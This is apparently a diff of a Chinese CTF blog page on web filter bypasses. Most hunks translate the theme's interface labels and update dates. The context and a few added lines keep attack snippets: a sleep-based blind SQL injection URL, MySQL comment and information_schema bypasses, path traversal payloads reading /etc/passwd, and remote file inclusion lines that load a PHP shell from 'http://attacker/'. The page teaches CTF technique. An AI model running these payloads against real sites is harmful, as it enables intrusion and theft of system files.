@@ -23,7 +23,7 @@
 <meta property="og:site_name" content="啦啦菌NODE">
 <meta property="og:description" content="—  从零开始的笔记  —— sql，上传，目录  —">
 <meta property="og:locale" content="zh-CN">
-<meta property="og:updated_time" content="2018-03-10T12:47:06.524Z">
+<meta property="og:updated_time" content="2018-03-31T07:28:27.508Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="WEB-CTF中的绕过">
 <meta name="twitter:description" content="—  从零开始的笔记  —— sql，上传，目录  —">
@@ -145,13 +145,13 @@
                 <div class="tips-box hide">
                     <div class="tips-arrow"></div>
                     <ul class="tips-inner">
-                        <li>Menu</li>
-                        <li>Tags</li>
+                        <li>菜单</li>
+                        <li>标签</li>
                         
-                        <li>Friends</li>
+                        <li>友情链接</li>
                         
                         
-                        <li>About Me</li>
+                        <li>关于我</li>
                         
                     </ul>
                 </div>
@@ -269,7 +269,7 @@
             </nav>
         </header>                
     </div>
-    <link class="menu-list" tags="Tags" friends="Friends" about="About Me"/>
+    <link class="menu-list" tags="标签" friends="友情链接" about="关于我"/>
 </nav>
       <div class="body-wrap"><article id="post-WEB-CTF中的绕过" class="article article-type-post" itemscope itemprop="blogPost">
   
@@ -327,7 +327,7 @@
 </ul>
 <figure class="highlight sql"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">select</span> <span class="keyword">user</span>() <span class="keyword">from</span> dual <span class="keyword">where</span> <span class="number">1</span>=<span class="number">1</span> <span class="keyword">and</span> <span class="number">2</span>=<span class="number">2</span>;   <span class="comment">---------&gt;   select(user())from dual where(1=1)and(2=2)</span></div><div class="line">利用函数完成猜解  如：  猜解user()第二个字符的ascii码是不是109，若是109，则页面加载将延迟</div><div class="line">	http://www.xxx.com/index.php?id=(sleep(ascii(mid(user()from(2)for(1)))=109))</div></pre></td></tr></table></figure>
 <ul>
-<li>select+user()  +代替空格  不是url编码空格的+而是直接的+</li>
+<li>select+user()  +代替空格  不是url编码空格的+而是直接的+<h3 id="过滤information-schema"><a href="#过滤information-schema" class="headerlink" title="过滤information_schema"></a>过滤information_schema</h3><code>select table_name from mysql.innodb_table</code></li>
 </ul>
 <h3 id="过滤"><a href="#过滤" class="headerlink" title="过滤="></a>过滤=</h3><ul>
 <li>=用<a href="http://www.runoob.com/mysql/mysql-like-clause.html" target="_blank" rel="external">like</a>代替</li>
@@ -336,6 +336,7 @@
 <h3 id="Mysql条件注释的利用-…"><a href="#Mysql条件注释的利用-…" class="headerlink" title="Mysql条件注释的利用  /! … /"></a>Mysql条件注释的利用  /<em>! … </em>/</h3><ul>
 <li><strong>/<em>! … </em>/</strong>:其中的语句如果在其它数据库中是不会被执行，但在MYSQL中它会执行。</li>
 <li><strong>/<em>!50000select</em>/</strong>:50000版本以上的  不执行括号中的语句 ，必定执行，用于过滤正则表达式</li>
+<li><strong>/<em>/</em> … */</strong></li>
 </ul>
 <h3 id="过滤逗号"><a href="#过滤逗号" class="headerlink" title="过滤逗号"></a>过滤逗号</h3><ul>
 <li><strong>limit ,</strong>中的<strong>,</strong> ：<a href="http://blog.csdn.net/keda8997110/article/details/8490895" target="_blank" rel="external">limit offset</a></li>
@@ -367,7 +368,7 @@
 </ul>
 <h2 id="文件包含及目录遍历"><a href="#文件包含及目录遍历" class="headerlink" title="文件包含及目录遍历"></a>文件包含及目录遍历</h2><p>两者应用相似，唯一不同就在于：前者是在url的<strong>参数</strong>中，后者是直接在url上</p>
 <h3 id="00截断"><a href="#00截断" class="headerlink" title="%00截断"></a>%00截断</h3><p>– 0字节 \x00<br>(magic_quotes_gpc=off PHP小于5.3.4)<br><code>../../../../../../etc/passwd%00</code></p>
-<h3 id="长目录截断"><a href="#长目录截断" class="headerlink" title="长目录截断"></a>长目录截断</h3><p>利用操作系统对目录最大长度的限制<br>(php版本小于5.2.8(?) linux&gt;4096 windows&gt;256)<br><code>././././././././././././././././passwd</code><br><code>////////////////////////passwd</code></p>
+<h3 id="长目录截断"><a href="#长目录截断" class="headerlink" title="长目录截断"></a>长目录截断</h3><p>利用操作系统对目录最大长度的限制<br>(php版本小于5.2.8(?) linux&gt;4096 windows&gt;256)<br><code>././././././././././././././././passwd././././././././././././././</code><br><code>////////////////////////passwd//////////////////////</code></p>
 <h3 id="点号截断"><a href="#点号截断" class="headerlink" title="点号截断"></a>点号截断</h3><p>(php版本小于5.2.8(?) 只适用windows 最后点号&gt;256)<br><code>?file=../../../../../../../../../boot.ini/………[…]…………</code></p>
 <h3 id="远程文件包含中的"><a href="#远程文件包含中的" class="headerlink" title="远程文件包含中的?"></a>远程文件包含中的<strong>?</strong></h3><p>远程文件包含本身参数传递的就是url地址，末尾加个<strong>？</strong>会把之后的系统后台添加的字符串理解为无用参数<br><code>/?param=http://attacker/phpshell.txt?</code><br><code>require_once &#39;http://attacker/phpshell.txt?/action/m_share.php&#39;;</code></p>
 <p>以上偷取葛大佬的部分栗子</p>
@@ -379,17 +380,17 @@
   
     
     <div class="copyright">
-        <p><span>Title:</span><a href="/2017/10/19/WEB-CTF中的绕过/">WEB-CTF中的绕过</a></p>
-        <p><span>Author:</span><a href="/" title="Back to Homepage">LaLa</a></p>
-        <p><span>Created:</span>2017-10-19, 16:51:11</p>
-        <p><span>Updated:</span>2018-03-10, 20:47:06</p>
+        <p><span>本文标题:</span><a href="/2017/10/19/WEB-CTF中的绕过/">WEB-CTF中的绕过</a></p>
+        <p><span>文章作者:</span><a href="/" title="回到主页">LaLa</a></p>
+        <p><span>发布时间:</span>2017-10-19, 16:51:11</p>
+        <p><span>最后更新:</span>2018-03-31, 15:28:27</p>
         <p>
-            <span>Full URL:</span><a class="post-url" href="/2017/10/19/WEB-CTF中的绕过/" title="WEB-CTF中的绕过">http://lalajun.com/2017/10/19/WEB-CTF中的绕过/</a>
-            <span class="copy-path" data-clipboard-text="From http://lalajun.com/2017/10/19/WEB-CTF中的绕过/　　By LaLa" title="Copy Article&#39;s Link &amp; Author"><i class="fa fa-clipboard"></i></span>
+            <span>原始链接:</span><a class="post-url" href="/2017/10/19/WEB-CTF中的绕过/" title="WEB-CTF中的绕过">http://lalajun.com/2017/10/19/WEB-CTF中的绕过/</a>
+            <span class="copy-path" data-clipboard-text="原文: http://lalajun.com/2017/10/19/WEB-CTF中的绕过/　　作者: LaLa" title="点击复制文章链接"><i class="fa fa-clipboard"></i></span>
             <script> var clipboard = new Clipboard('.copy-path'); </script>
         </p>
         <p>
-            <span>License:</span><i class="fa fa-creative-commons"></i> <a rel="license" href="http://creativecommons.org/licenses/by-nc-sa/4.0/" title="CC BY-NC-SA 4.0 International" target = "_blank">"CC BY-NC-SA 4.0"</a> Keep Link &amp; Author if Distribute.
+            <span>许可协议:</span><i class="fa fa-creative-commons"></i> <a rel="license" href="http://creativecommons.org/licenses/by-nc-sa/4.0/" title="CC BY-NC-SA 4.0 International" target = "_blank">"署名-非商用-相同方式共享 4.0"</a> 转载请保留原文链接及作者。
         </p>
     </div>
 
@@ -416,9 +417,9 @@
 </article>
 
     <div id="toc" class="toc-article">
-        <strong class="toc-title">Contents</strong>
+        <strong class="toc-title">文章目录</strong>
         
-            <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#sql注入"><span class="toc-text">sql注入</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#编码"><span class="toc-text">编码</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#重复"><span class="toc-text">重复</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#大小写混用"><span class="toc-text">大小写混用</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#过滤空格"><span class="toc-text">过滤空格</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#过滤"><span class="toc-text">过滤=</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Mysql条件注释的利用-…"><span class="toc-text">Mysql条件注释的利用  /! … /</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#过滤逗号"><span class="toc-text">过滤逗号</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#过滤引号"><span class="toc-text">过滤引号</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#过滤-lt-与-gt"><span class="toc-text">过滤<与></span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#过滤sleep"><span class="toc-text">过滤sleep</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#过滤注释符号（-，–）"><span class="toc-text">过滤注释符号（#，–）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#过滤单引号"><span class="toc-text">过滤单引号</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#过滤order-by"><span class="toc-text">过滤order by</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#利用等价函数"><span class="toc-text">利用等价函数</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#文件上传"><span class="toc-text">文件上传</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#文件包含及目录遍历"><span class="toc-text">文件包含及目录遍历</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#00截断"><span class="toc-text">%00截断</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#长目录截断"><span class="toc-text">长目录截断</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#点号截断"><span class="toc-text">点号截断</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#远程文件包含中的"><span class="toc-text">远程文件包含中的?</span></a></li></ol></li></ol>
+            <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#sql注入"><span class="toc-text">sql注入</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#编码"><span class="toc-text">编码</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#重复"><span class="toc-text">重复</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#大小写混用"><span class="toc-text">大小写混用</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#过滤空格"><span class="toc-text">过滤空格</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#过滤information-schema"><span class="toc-text">过滤information_schema</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#过滤"><span class="toc-text">过滤=</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Mysql条件注释的利用-…"><span class="toc-text">Mysql条件注释的利用  /! … /</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#过滤逗号"><span class="toc-text">过滤逗号</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#过滤引号"><span class="toc-text">过滤引号</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#过滤-lt-与-gt"><span class="toc-text">过滤<与></span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#过滤sleep"><span class="toc-text">过滤sleep</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#过滤注释符号（-，–）"><span class="toc-text">过滤注释符号（#，–）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#过滤单引号"><span class="toc-text">过滤单引号</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#过滤order-by"><span class="toc-text">过滤order by</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#利用等价函数"><span class="toc-text">利用等价函数</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#文件上传"><span class="toc-text">文件上传</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#文件包含及目录遍历"><span class="toc-text">文件包含及目录遍历</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#00截断"><span class="toc-text">%00截断</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#长目录截断"><span class="toc-text">长目录截断</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#点号截断"><span class="toc-text">点号截断</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#远程文件包含中的"><span class="toc-text">远程文件包含中的?</span></a></li></ol></li></ol>
         
     </div>
     <style>
@@ -432,10 +433,10 @@
         }
     </style>
 
-    <input type="button" id="tocButton" value="Hide"  title="Show or Hide Table of Contents">
+    <input type="button" id="tocButton" value="隐藏目录"  title="点击按钮隐藏或者显示文章目录">
 
     <script>
-        yiliaConfig.toc = ["Hide", "Show", !!"false"];
+        yiliaConfig.toc = ["隐藏目录", "显示目录", !!"false"];
     </script>
 
 
@@ -449,21 +450,21 @@
 
     <div class="scroll" id="post-nav-button">
         
-            <a href="/2017/12/05/WEB-CTF中的SQL文件操作/" title="Pre: WEB-CTF中的SQL文件操作">
+            <a href="/2017/12/05/WEB-CTF中的SQL文件操作/" title="上一篇: WEB-CTF中的SQL文件操作">
                 <i class="fa fa-angle-left"></i>
             </a>
         
 
-        <a title="Mini Archives"><i class="fa fa-bars"></i><i class="fa fa-times"></i></a>
+        <a title="文章列表"><i class="fa fa-bars"></i><i class="fa fa-times"></i></a>
 
         
-            <a href="/2017/09/24/WEB-CTF中的sql盲注/" title="Next: WEB-CTF中的sql盲注">
+            <a href="/2017/09/24/WEB-CTF中的sql盲注/" title="下一篇: WEB-CTF中的sql盲注">
                 <i class="fa fa-angle-right"></i>
             </a>
         
     </div>
 
-    <ul class="post-list"><li class="post-list-item"><a class="post-list-link" href="/2018/03/06/WEB-PHP核心配置/">WEB-PHP核心配置</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/02/26/WEB-Cookie注入与伪静态注入/">WEB-Cookie注入与伪静态注入</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/01/30/WEB-HTTP基础/">WEB-HTTP基础</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/01/25/python笔记/">python2.7笔记</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/12/27/比特币&区块链与交易/">比特币&区块链与交易</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/12/27/比特币&区块链与挖矿/">比特币&区块链与挖矿</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/12/05/WEB-CTF中的SQL文件操作/">WEB-CTF中的SQL文件操作</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/10/19/WEB-CTF中的绕过/">WEB-CTF中的绕过</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/09/24/WEB-CTF中的sql盲注/">WEB-CTF中的sql盲注</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/09/18/ZJGSCTF_writeup/">ZJGSCTF_writeup</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/08/29/WEB-CTF中的SQL注入/">WEB-CTF中的SQL注入</a></li></ul>
+    <ul class="post-list"><li class="post-list-item"><a class="post-list-link" href="/2018/04/03/web-phpinfo包含临时文件/">WEB-基于phpinfo的包含临时文件</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/03/19/WEB-LFI与RFI利用/">WEB-LFI与RFI利用</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/03/06/WEB-PHP核心配置/">WEB-PHP核心配置</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/02/26/WEB-Cookie注入与伪静态注入/">WEB-Cookie注入与伪静态注入</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/01/30/WEB-HTTP基础/">WEB-HTTP基础</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/01/25/python笔记/">python2.7笔记</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/12/27/比特币&区块链与交易/">比特币&区块链与交易</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/12/27/比特币&区块链与挖矿/">比特币&区块链与挖矿</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/12/05/WEB-CTF中的SQL文件操作/">WEB-CTF中的SQL文件操作</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/10/19/WEB-CTF中的绕过/">WEB-CTF中的绕过</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/09/24/WEB-CTF中的sql盲注/">WEB-CTF中的sql盲注</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/09/18/ZJGSCTF_writeup/">ZJGSCTF_writeup</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/08/29/WEB-CTF中的SQL注入/">WEB-CTF中的SQL注入</a></li></ul>
 
 
 
@@ -480,14 +481,14 @@
                 2017-2018 LaLa
             </div>
             <div class="footer-right">
-                <a href="http://hexo.io/" target="_blank" title="A fast, simple &amp; powerful blog framework">Hexo</a>  Theme <a href="https://github.com/MOxFIVE/hexo-theme-yelee" target="_blank" title="Another simple and elegant theme for Hexo  v3.5">Yelee</a> by MOxFIVE <i class="fa fa-heart animated infinite pulse"></i>
+                <a href="http://hexo.io/" target="_blank" title="快速、简洁且高效的博客框架">Hexo</a>  Theme <a href="https://github.com/MOxFIVE/hexo-theme-yelee" target="_blank" title="简而不减 Hexo 双栏博客主题  v3.5">Yelee</a> by MOxFIVE <i class="fa fa-heart animated infinite pulse"></i>
             </div>
         </div>
         
             <div class="visit">
                 
                     <span id="busuanzi_container_site_pv" style='display:none'>
-                        <span id="site-visit" title="Site Visitors"><i class="fa fa-user" aria-hidden="true"></i><span id="busuanzi_value_site_uv"></span>
+                        <span id="site-visit" title="本站到访数"><i class="fa fa-user" aria-hidden="true"></i><span id="busuanzi_value_site_uv"></span>
                         </span>
                     </span>
                 
@@ -496,7 +497,7 @@
                 
                 
                     <span id="busuanzi_container_page_pv" style='display:none'>
-                        <span id="page-visit"  title="Page Hits"><i class="fa fa-eye animated infinite pulse" aria-hidden="true"></i><span id="busuanzi_value_page_pv"></span>
+                        <span id="page-visit"  title="本页阅读量"><i class="fa fa-eye animated infinite pulse" aria-hidden="true"></i><span id="busuanzi_value_page_pv"></span>
                         </span>
                     </span>
                 
@@ -529,9 +530,9 @@
 
 
 <div class="scroll" id="scroll">
-    <a href="#" title="Back to Top"><i class="fa fa-arrow-up"></i></a>
-    <a href="#comments" onclick="load$hide();" title="Comments"><i class="fa fa-comments-o"></i></a>
-    <a href="#footer" title="Go to Bottom"><i class="fa fa-arrow-down"></i></a>
+    <a href="#" title="返回顶部"><i class="fa fa-arrow-up"></i></a>
+    <a href="#comments" onclick="load$hide();" title="查看评论"><i class="fa fa-comments-o"></i></a>
+    <a href="#footer" title="转到底部"><i class="fa fa-arrow-down"></i></a>
 </div>
 <script>
     // Open in New Window
